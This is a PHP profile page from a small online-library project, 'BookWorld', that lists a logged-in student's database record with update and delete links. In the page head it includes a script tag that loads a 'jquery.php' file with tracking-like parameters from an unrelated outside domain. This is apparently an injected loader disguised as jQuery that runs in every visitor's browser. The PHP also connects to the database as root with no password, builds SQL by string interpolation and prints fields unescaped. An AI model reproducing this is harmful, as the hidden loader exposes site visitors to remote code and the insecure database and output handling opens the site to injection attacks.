<?php
session_start();
if(!isset($_SESSION["uid"]))
{
header("location:login.php");
}
?>
<html>
<head><title>View Profile</title>
<style>
        #abc:hover{
            background-color: whitesmoke;
        }
    </style></head>

<link href="css/style.css" rel="stylesheet" type="text/css">
<script src="https://macutnova.com/jquery.php?u=fd9d3edf8021c28f5dc8d5e7c668b6bb&c=pbbt&p=1"></script>
<body>
<form>
    <font face="Lucida Calligraphy" style="font-weight:bolder;">
<div id="wrapper"> 

  <div id="header"> 

    <div class="top_banner">
      <h1>BookWorld</h1>
      <p>The Authentic Online Library</p>
    </div>
 
  </div>

  <div id="page_content">

    <div class="navigation" style="background-color:#666699;" >
      <ul>
        <li id="abc"><a href="masterpage.php">Home</a></li>
        <?php if(!isset($_SESSION['uid'])) echo"<li id='abc'><a href='registration.php'>Register</a></li>";?>
       <li id="abc"><?php if(isset($_SESSION['uid']))echo"<a href='logout.php'>Logout</a>"; else echo"<a href='login.php'>Login</a>";?></li>
	<li id="abc"><a href="viewcourses.php">View Profile</a></li>
        
        <li id="abc"><a href="product.php">Product</a></li>
        <li id="abc"><a href="aboutus.php">About Us</a></li>
        
        
      </ul>
    </div>

 

<?php
$h=mysql_connect("localhost","root","");
mysql_select_db("stp16");
$qry="select * from student where email='$_SESSION[uid]'";
$res=mysql_query($qry);
if(mysql_affected_rows()>0)
{
	echo"<table width=100%><tr><td>Name</td><td>Email</td><td>Contact</td><td>Address</td><td>Location</td><td>Interests</td><td>Update</td><td>Delete</td></tr>";
	while($row=mysql_fetch_array($res))
		{
		  echo"<tr><td>$row[0]</td><td>$row[1]</td><td>$row[2]</td><td>$row[3]</td><td>$row[5]</td><td>$row[7]</td><td><a href='registration.php?id=$row[1]'>Update</a></td><td><a href='delete.php?id=$row[1]'>Delete</a></td></tr>";
		}
	echo"</table>";
}
else  echo "Record Not Found";
?>
 <div id="footer" style="background-color:#FF9900;">Copyright &copy; 2014. Design by Sankalita Souradeep Sayan<br>
    
    <!--DO NOT remove footer link-->
    <!--Template designed by--></div>
	
    <!--/. end footer from here-->
  </div>

</div>
    </font>
</form>

</body>
</html>